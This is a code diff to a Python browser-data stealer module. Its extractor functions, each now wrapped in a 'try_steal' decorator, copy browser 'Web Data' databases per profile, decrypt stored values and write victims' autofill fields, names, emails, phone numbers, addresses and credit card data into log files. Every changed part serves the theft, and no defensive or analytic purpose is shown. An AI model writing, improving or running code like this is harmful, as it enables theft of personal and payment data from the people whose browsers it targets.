@@ -1,7 +1,7 @@
 """ IMPORTS """
 import json
 import sqlite3
-from util import get_profiles, create_temp_file, create_log_file, try_decrypt
+from util import try_steal, get_profiles, create_temp_file, log_data, try_decrypt
 
 
 """
@@ -26,7 +26,7 @@ Tables of interest from SQLi Recon:
 def autofill_stealer(browser: dict, encryption_key: str) -> None:
     """ Steals autofill data from a browser and places them into the logs directory """
     # Examine each profile
-    profile_names = get_profiles(browser['path'])
+    profile_names = get_profiles(browser)
     for profile_name in profile_names:
         # Copy original sqlite3 database to access it without killing any active Chrome processes
         db_path = create_temp_file(browser, profile_name, 'Web Data')
@@ -52,6 +52,7 @@ def autofill_stealer(browser: dict, encryption_key: str) -> None:
 
 
 
+@try_steal
 def extract_autofill(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill table and places them into the logs directory """
     # Query data
@@ -68,10 +69,11 @@ def extract_autofill(browser_name: str, profile_name: str, encryption_key: str, 
 
     # Log data
     if data:
-        log_file_path = f'{browser_name} {profile_name} Autofill Fields'
-        create_log_file(data, log_file_path)
+        log_file_name = profile_name + ' Autofill Fields'
+        log_data(data, browser_name, log_file_name)
 
 
+@try_steal
 def extract_autofill_profiles(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profiles table and places them into the logs directory """
     # Query data
@@ -93,12 +95,11 @@ def extract_autofill_profiles(browser_name: str, profile_name: str, encryption_k
 
     # Log data
     if data:
-        log_file_path = f'{browser_name} {profile_name} Autofill Profiles'
-        create_log_file(data, log_file_path)
+        log_file_name = profile_name + ' Autofill Profiles'
+        log_data(data, browser_name, log_file_name)
 
 
-
-
+@try_steal
 def extract_autofill_addresses(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_addresses table and places them into the logs directory """
     # Query data
@@ -119,32 +120,42 @@ def extract_autofill_addresses(browser_name: str, profile_name: str, encryption_
 
     # Log data
     if data:
-        log_file_path = f'{browser_name} {profile_name} Autofill Addresses'
-        create_log_file(data, log_file_path)
+        log_file_name = profile_name + ' Autofill Addresses'
+        log_data(data, browser_name, log_file_name)
 
 
+@try_steal
 def extract_autofill_names(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_names table and places them into the logs directory """
-    # Query data
-    db_cursor.execute('SELECT honorific_prefix, full_name FROM autofill_profile_names')
+    # Query full name data
+    db_cursor.execute('SELECT full_name FROM autofill_profile_names')
+    names = [try_decrypt(row[0], encryption_key) for row in db_cursor.fetchall()]
+
+    # Extract titles if possible
+    titles = [''] * len(names)
+    try:
+        db_cursor.execute('SELECT honorific_prefix FROM autofill_profile_names')
+        titles = [try_decrypt(row[0], encryption_key) for row in db_cursor.fetchall()]
+    except sqlite3.OperationalError:
+        # ignore title if unable to extract any
+        pass
 
     # Process data
     data = set()
-    for title, full_name in db_cursor.fetchall():
-        # Combine title and full name
-        title = try_decrypt(title, encryption_key) or ''
-        full_name = try_decrypt(full_name, encryption_key) or ''
-        name = title + full_name
-        # Store non-empty names
+    assert len(titles) == len(names)
+    for title, full_name in zip(titles, names):
+        # ignore title or full_name if None
+        name = (title or '') + (full_name or '')
         if name:
             data.add(name)
 
     # Log data
     if data:
-        log_file_path = f'{browser_name} {profile_name} Autofill Names'
-        create_log_file(list(data), log_file_path)
+        log_file_name = profile_name + ' Autofill Names'
+        log_data(list(data), browser_name, log_file_name)
 
 
+@try_steal
 def extract_autofill_emails(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_emails table and places them into the logs directory """
     # Query data
@@ -156,10 +167,11 @@ def extract_autofill_emails(browser_name: str, profile_name: str, encryption_key
 
     # Log data
     if data:
-        log_file_path = f'{browser_name} {profile_name} Autofill Emails'
-        create_log_file(data, log_file_path)
+        log_file_name = profile_name + ' Autofill Emails'
+        log_data(data, browser_name, log_file_name)
 
 
+@try_steal
 def extract_autofill_phones(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_phones table and places them into the logs directory """
     # Query data
@@ -171,10 +183,11 @@ def extract_autofill_phones(browser_name: str, profile_name: str, encryption_key
 
     # Log data
     if data:
-        log_file_path = f'{browser_name} {profile_name} Autofill Phones'
-        create_log_file(data, log_file_path)
+        log_file_name = profile_name + ' Autofill Phones'
+        log_data(data, browser_name, log_file_name)
 
 
+@try_steal
 def extract_credit_cards(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the credit_cards table and places them into the logs directory """
     # Query data
@@ -194,8 +207,8 @@ def extract_credit_cards(browser_name: str, profile_name: str, encryption_key: s
 
     # Log data
     if data:
-        log_file_path = f'{browser_name} {profile_name} Credit Cards'
-        create_log_file(data, log_file_path)
+        log_file_name = profile_name + ' Credit Cards'
+        log_data(data, browser_name, log_file_name)
 
 
 
